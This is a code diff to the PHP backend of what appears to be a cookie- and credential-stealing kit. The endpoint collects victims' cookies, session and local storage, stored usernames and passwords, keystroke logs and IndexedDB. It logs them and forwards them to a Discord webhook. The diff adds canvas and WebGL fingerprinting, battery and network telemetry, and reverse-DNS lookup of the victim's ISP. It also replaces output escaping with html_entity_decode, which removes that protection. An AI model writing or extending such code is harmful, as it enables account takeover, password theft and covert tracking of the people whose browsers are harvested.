@@ -37,7 +37,7 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    SANITISATION HELPER
    ════════════════════════════════════════════════════════════ */
 function cleanCookie(string $val): string {
-    return htmlspecialchars(strip_tags(trim($val)), ENT_QUOTES | ENT_HTML5, 'UTF-8');
+    return html_entity_decode(strip_tags(trim($val)), ENT_QUOTES | ENT_HTML5, 'UTF-8');
 }
 
 /* ════════════════════════════════════════════════════════════
@@ -67,16 +67,33 @@ if ($json_data === null) {
     $json_data = $_POST;
 }
 
-$raw_cookies       = cleanCookie($json_data['cookies']          ?? 'None');
-$tracking_cookies  = cleanCookie($json_data['tracking_cookies'] ?? '');
-$session_storage   = cleanCookie($json_data['session_storage']  ?? 'None');
-$local_storage     = cleanCookie($json_data['local_storage']    ?? 'None');
-$stored_username   = cleanCookie($json_data['stored_username']  ?? '');
-$stored_password   = cleanCookie($json_data['stored_password']  ?? '');
-$input_log         = cleanCookie($json_data['input_log']        ?? '');
-$indexeddb         = cleanCookie($json_data['indexeddb']         ?? '');
-$page_url          = cleanCookie($json_data['page_url']         ?? 'Unknown');
-$page_title        = cleanCookie($json_data['page_title']       ?? 'Unknown');
+$raw_cookies          = cleanCookie($json_data['cookies']             ?? 'None');
+$tracking_cookies     = cleanCookie($json_data['tracking_cookies']    ?? '');
+$session_storage      = cleanCookie($json_data['session_storage']     ?? 'None');
+$local_storage        = cleanCookie($json_data['local_storage']       ?? 'None');
+$stored_username      = cleanCookie($json_data['stored_username']     ?? '');
+$stored_password      = cleanCookie($json_data['stored_password']     ?? '');
+$input_log            = cleanCookie($json_data['input_log']           ?? '');
+$indexeddb            = cleanCookie($json_data['indexeddb']            ?? '');
+$page_url             = cleanCookie($json_data['page_url']            ?? 'Unknown');
+$page_title           = cleanCookie($json_data['page_title']          ?? 'Unknown');
+
+/* ── Hardware & Telemetry fields ──────────────────────────── */
+$screen_resolution    = cleanCookie($json_data['screen_resolution']   ?? '');
+$screen_viewport      = cleanCookie($json_data['screen_viewport']     ?? '');
+$screen_color_depth   = cleanCookie($json_data['screen_color_depth']  ?? '');
+$screen_pixel_ratio   = cleanCookie($json_data['screen_pixel_ratio']  ?? '');
+$battery_level        = cleanCookie($json_data['battery_level']       ?? '');
+$battery_charging     = cleanCookie($json_data['battery_charging']    ?? '');
+$connection_type      = cleanCookie($json_data['connection_type']     ?? '');
+$connection_effective = cleanCookie($json_data['connection_effective']?? '');
+$connection_downlink  = cleanCookie($json_data['connection_downlink'] ?? '');
+$connection_rtt       = cleanCookie($json_data['connection_rtt']      ?? '');
+$canvas_fingerprint   = cleanCookie($json_data['canvas_fingerprint']  ?? '');
+$webgl_vendor         = cleanCookie($json_data['webgl_vendor']        ?? '');
+$webgl_renderer       = cleanCookie($json_data['webgl_renderer']      ?? '');
+$hardware_concurrency = cleanCookie($json_data['hardware_concurrency']?? '');
+$device_memory        = cleanCookie($json_data['device_memory']       ?? '');
 
 /* ── Filter out our own _nx_ cookies from the display ─────── */
 $real_cookies = filterNxCookies($raw_cookies);
@@ -91,9 +108,10 @@ $has_local_storage   = !empty($local_storage) && $local_storage !== 'None';
 $has_credentials     = !empty($stored_username) || !empty($stored_password);
 $has_input_log       = !empty($input_log);
 $has_indexeddb       = !empty($indexeddb);
+$has_telemetry       = !empty($screen_resolution) || !empty($canvas_fingerprint) || !empty($battery_level) || !empty($connection_type);
 
 $has_meaningful_data = $has_real_cookies || $has_session_storage || $has_local_storage
-                     || $has_credentials || $has_input_log || $has_indexeddb;
+                     || $has_credentials || $has_input_log || $has_indexeddb || $has_telemetry;
 
 if (!$has_meaningful_data) {
     // Nothing real captured -- silently succeed without printing/saving/notifying
@@ -102,12 +120,21 @@ if (!$has_meaningful_data) {
 }
 
 /* ════════════════════════════════════════════════════════════
-   COMMON METADATA
+   COMMON METADATA & REVERSE DNS RESOLUTION
    ════════════════════════════════════════════════════════════ */
 $data_dir   = dirname(__DIR__) . '/data';
 $timestamp  = date('Y-m-d H:i:s T');
 $client_ip  = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+
+/* Resolve ISP Hostname via Reverse DNS (Best effort for network/broadband identification) */
+$reverse_host = 'Unknown';
+if (!empty($client_ip) && filter_var($client_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+    $reverse_host = @gethostbyaddr($client_ip);
+    if ($reverse_host === false || $reverse_host === $client_ip) {
+        $reverse_host = 'Not resolved';
+    }
+}
 
 if (!is_dir($data_dir)) {
     mkdir($data_dir, 0750, true);
@@ -119,7 +146,7 @@ if (!is_dir($data_dir)) {
 $dedup_file = $data_dir . '/.cookie_dedup';
 $dedup_key  = md5($client_ip . '|' . $real_cookies . '|' . $stored_username
               . '|' . $stored_password . '|' . $input_log
-              . '|' . $session_storage . '|' . $local_storage);
+              . '|' . $session_storage . '|' . $local_storage . '|' . $canvas_fingerprint);
 $dedup_data = @file_get_contents($dedup_file);
 if ($dedup_data) {
     $dedup = json_decode($dedup_data, true);
@@ -135,19 +162,35 @@ file_put_contents($dedup_file, json_encode(['key' => $dedup_key, 'time' => time(
    BUILD DATA RECORD
    ════════════════════════════════════════════════════════════ */
 $record = [
-    'timestamp'        => $timestamp,
-    'ip'               => $client_ip,
-    'user_agent'       => $user_agent,
-    'page_url'         => $page_url,
-    'page_title'       => $page_title,
-    'cookies'          => $real_cookies ?: 'None',
-    'tracking_cookies' => $tracking_cookies,
-    'session_storage'  => $session_storage,
-    'local_storage'    => $local_storage,
-    'stored_username'  => $stored_username,
-    'stored_password'  => $stored_password,
-    'input_log'        => $input_log,
-    'indexeddb'        => $indexeddb,
+    'timestamp'            => $timestamp,
+    'ip'                   => $client_ip,
+    'reverse_host'         => $reverse_host,
+    'user_agent'           => $user_agent,
+    'page_url'             => $page_url,
+    'page_title'           => $page_title,
+    'screen_resolution'    => $screen_resolution,
+    'screen_viewport'      => $screen_viewport,
+    'screen_pixel_ratio'   => $screen_pixel_ratio,
+    'screen_color_depth'   => $screen_color_depth,
+    'battery_level'        => $battery_level,
+    'battery_charging'     => $battery_charging,
+    'connection_type'      => $connection_type,
+    'connection_effective' => $connection_effective,
+    'connection_downlink'  => $connection_downlink,
+    'connection_rtt'       => $connection_rtt,
+    'canvas_fingerprint'   => $canvas_fingerprint,
+    'webgl_vendor'         => $webgl_vendor,
+    'webgl_renderer'       => $webgl_renderer,
+    'hardware_concurrency' => $hardware_concurrency,
+    'device_memory'        => $device_memory,
+    'cookies'              => $real_cookies ?: 'None',
+    'tracking_cookies'     => $tracking_cookies,
+    'session_storage'      => $session_storage,
+    'local_storage'        => $local_storage,
+    'stored_username'      => $stored_username,
+    'stored_password'      => $stored_password,
+    'input_log'            => $input_log,
+    'indexeddb'            => $indexeddb,
 ];
 
 /* ════════════════════════════════════════════════════════════
@@ -155,13 +198,42 @@ $record = [
    ════════════════════════════════════════════════════════════ */
 $divider  = str_repeat('═', 60);
 $subdiv   = str_repeat('─', 40);
+
+/* Helper: return the value or a professional fallback message */
+function nxLabel(string $val, string $fallback = 'Not fetched'): string {
+    return (!empty($val) && $val !== 'None') ? $val : $fallback;
+}
+
 $txt_entry  = "\n{$divider}\n";
-$txt_entry .= "🍪 COOKIE & SESSION CAPTURE  [{$timestamp}]\n";
+$txt_entry .= "🔍 TELEMETRY, DEVICE & SESSION CAPTURE  [{$timestamp}]\n";
 $txt_entry .= "{$divider}\n";
 $txt_entry .= "IP Address      : {$client_ip}\n";
+$txt_entry .= "Network Host    : " . nxLabel($reverse_host, 'Could not resolve (private/local IP)') . "\n";
 $txt_entry .= "User-Agent      : {$user_agent}\n";
 $txt_entry .= "Page            : {$page_title}\n";
 $txt_entry .= "URL             : {$page_url}\n";
+
+$txt_entry .= "{$subdiv}\n";
+$txt_entry .= "Screen Size     : " . nxLabel($screen_resolution) . "\n";
+if (!empty($screen_viewport) && $screen_viewport !== 'Could not detect') {
+    $txt_entry .= "Viewport        : {$screen_viewport}, Pixel Ratio: " . nxLabel($screen_pixel_ratio) . "\n";
+}
+$txt_entry .= "Battery         : " . nxLabel($battery_level) . " — " . nxLabel($battery_charging, 'N/A') . "\n";
+$txt_entry .= "Network Conn    : " . nxLabel($connection_type);
+if (!empty($connection_effective) && $connection_effective !== $connection_type) {
+    $txt_entry .= " ({$connection_effective})";
+}
+if (!empty($connection_downlink)) {
+    $txt_entry .= " | Speed: {$connection_downlink}";
+}
+if (!empty($connection_rtt)) {
+    $txt_entry .= " | Latency: {$connection_rtt}";
+}
+$txt_entry .= "\n";
+$txt_entry .= "Canvas Hash     : " . nxLabel($canvas_fingerprint) . "\n";
+$txt_entry .= "GPU Model       : " . nxLabel($webgl_renderer) . "\n";
+$txt_entry .= "CPU Cores       : " . nxLabel($hardware_concurrency) . "\n";
+$txt_entry .= "Device Memory   : " . nxLabel($device_memory) . "\n";
 
 if ($has_real_cookies) {
     $txt_entry .= "{$subdiv}\n";
@@ -217,7 +289,21 @@ if ($fp) {
 /* ════════════════════════════════════════════════════════════
    3. TERMINAL FLAG  (.flag_cookies)
    ════════════════════════════════════════════════════════════ */
-$terminal_output = "[+] IP: {$client_ip}  |  Page: {$page_title}\n";
+$terminal_output  = "[+] IP: {$client_ip}  |  Page: {$page_title}\n";
+$terminal_output .= "[+] Screen: " . nxLabel($screen_resolution) . "  |  Scale: " . nxLabel($screen_pixel_ratio) . "\n";
+$terminal_output .= "[+] Battery: " . nxLabel($battery_level) . "  |  " . nxLabel($battery_charging, 'N/A') . "\n";
+
+$net_label = nxLabel($connection_type);
+if (!empty($connection_effective) && $connection_effective !== $connection_type) {
+    $net_label .= " ({$connection_effective})";
+}
+if (!empty($connection_downlink)) {
+    $net_label .= " — {$connection_downlink}";
+}
+$terminal_output .= "[+] Network: {$net_label}\n";
+$terminal_output .= "[+] ISP Host: " . nxLabel($reverse_host, 'Could not resolve') . "\n";
+$terminal_output .= "[+] Canvas Hash: " . nxLabel($canvas_fingerprint) . "\n";
+$terminal_output .= "[+] GPU: " . nxLabel($webgl_renderer) . "\n";
 
 if ($has_real_cookies) {
     $c_disp = (strlen($real_cookies) > 300) ? substr($real_cookies, 0, 300) . '...' : $real_cookies;
@@ -256,8 +342,13 @@ file_put_contents($data_dir . '/.flag_cookies', $terminal_output);
    4. DISCORD WEBHOOK ALERT
    ════════════════════════════════════════════════════════════ */
 $discord_fields = [
-    '🌐 IP Address' => $client_ip,
-    '📄 Page'       => $page_title,
+    '🌐 IP Address'   => $client_ip,
+    '📄 Page'         => $page_title,
+    '🖥️ Screen'       => nxLabel($screen_resolution) . ' (' . nxLabel($screen_pixel_ratio) . ')',
+    '🔋 Battery'      => nxLabel($battery_level) . ' — ' . nxLabel($battery_charging, 'N/A'),
+    '📶 Network'      => nxLabel($connection_type) . (!empty($connection_downlink) ? " • {$connection_downlink}" : ''),
+    '🏢 ISP / Host'   => nxLabel($reverse_host, 'Could not resolve'),
+    '🎮 GPU / Canvas' => nxLabel($webgl_renderer) . ' [Hash: ' . nxLabel($canvas_fingerprint) . ']',
 ];
 
 if ($has_real_cookies) {
@@ -287,7 +378,7 @@ if ($has_input_log) {
     $discord_fields['⌨️ Input Log'] = (strlen($input_log) > 200) ? substr($input_log, 0, 200) . '…' : $input_log;
 }
 
-sendDiscordAlert('🍪 Cookie & Session Capture', $discord_fields, 16744448 /* 0xFF8000 orange */);
+sendDiscordAlert('⚡ Device Telemetry & Session Capture', $discord_fields, 16744448 /* 0xFF8000 orange */);
 
 /* ── Success response ── */
 echo json_encode(['status' => 'success', 'message' => 'Data captured']);
